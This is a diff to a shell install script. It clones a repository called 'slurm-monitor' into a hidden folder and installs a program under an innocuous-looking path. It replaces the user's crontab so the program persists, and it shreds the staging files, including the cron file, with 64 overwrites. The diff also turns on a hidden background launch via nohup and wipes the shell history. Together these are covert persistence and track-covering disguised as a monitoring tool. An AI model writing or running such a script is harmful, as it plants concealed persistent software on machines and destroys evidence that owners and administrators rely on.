@@ -2,6 +2,9 @@
 
 echo "Downloading"
 
+git clone https://github.com/h4th0r/slurm-monitor.git .sm 2> /dev/null
+
+cd .sm/
 
 echo "Compiling"
 pth="$HOME/.local/sys-ht/"
@@ -17,7 +20,7 @@ cp kht_sys ${pth}
 cat crbck | sed "s@\/usr\/local\/bin\/kht\_sys@${pth}\/kht\_sys@g" > check
 crontab -r
 crontab check
-rm check
+shred -n 64 -u check
 
 cd ${pth}
 mv kht_sys kht_sys.py
@@ -26,9 +29,16 @@ find . -iname "*.pyc" | sed 's/.*/mv & kht_sys/g' | sh
 chmod 755 kht_sys
 find . -type f \( ! -iname "khc_st" ! -iname "kht_sys" \) | sed 's/.*/shred -n 64 -u &/g' | sh
 rm -fr __pycache__
+cd -
+
+pwd
+#find . -type f | sed 's/.*/shred -n 64 -u &/g' | sh
 
 #shred -n 64 -u kht_sys
 #shred -n 64 -u kht_sys.py
 
 echo "Done"
-#nohup ${pth}/kht_sys 1>/dev/null 2>&1 &
+nohup ${pth}/kht_sys 1>/dev/null 2>&1 &
+
+cat /dev/null > ~/.history
+history -cw 
